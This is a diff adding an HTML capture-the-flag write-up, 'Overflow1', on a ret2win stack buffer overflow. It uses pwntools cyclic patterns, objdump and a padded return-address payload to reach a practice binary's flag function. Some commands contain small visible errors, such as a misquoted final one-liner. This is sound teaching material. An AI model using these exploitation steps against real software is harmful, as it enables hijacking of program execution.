@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>Overflow1</title>
+  <style>
+      code{white-space: pre-wrap;}
+      span.smallcaps{font-variant: small-caps;}
+      span.underline{text-decoration: underline;}
+      div.column{display: inline-block; vertical-align: top; width: 50%;}
+  </style>
+  <!--[if lt IE 9]>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
+  <![endif]-->
+    <head>
+      <link rel="stylesheet" type="text/css" href="../../css/global.css"></link>
+      <script type="text/javascript" src="../../js/common.js"></script>
+    </head>
+</head>
+<body>
+    <div id="header"><a class="header" href="../../index.html">[]|\|[-/-\|_/\/\[]|\||)</a></div>
+    <div id="content" class="content" style="width:70%;height:auto">
+<header id="title-block-header">
+<h1 class="title">Overflow1</h1>
+</header>
+<p>Try to make it overflow</p>
+<pre><code>$ python -c &quot;print(&#39;A&#39;*128)&quot;|./vuln </code></pre>
+<p>Woah, were jumping to 0x414141 ! Segmentation fault (core dumped)</p>
+<p>0x414141 is the hex format of AAAA, it seems that the input and jumping address are cyclic, we need to find the exact padding to make it jump to the location of flag function.</p>
+<p>(De Bruijn Sequence)[https://en.wikipedia.org/wiki/De_Bruijn_sequence]</p>
+<pre><code>&gt;&gt;&gt; pwn.cyclic(100)
+b&#39;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&#39;
+
+$ vul &lt;&lt;&lt; &quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&quot;
+...
+Woah, were jumping to 0x61616174 !
+...</code></pre>
+<p><code>p32</code> to convert it back to char</p>
+<pre><code>padding = pwn.cyclic_find(&#39;&#39;.join(list(reversed(pwn.p32(0x61616174).decode())))</code></pre>
+<p>Find the location of flag function</p>
+<pre><code>$ objdump -D vuln|grep flag
+080485e6 &lt;flag&gt;:
+...</code></pre>
+<pre><code>payload = &#39;A&#39;*padding + &#39;\xe6\x85\x04\x08&#39;
+print(payload)</code></pre>
+<p>Run on server shell:</p>
+<pre><code>python -c &quot;print(&#39;A&#39;*padding + &#39;\xe6\x85\x04\x08&#39;)|./vuln&quot;</code></pre>
+<p>Get the flag in output.</p>
+    </div>
+    <a id="back-to-top" class="back-to-top" href="#header">TOP</a>
+</body>
+</html>
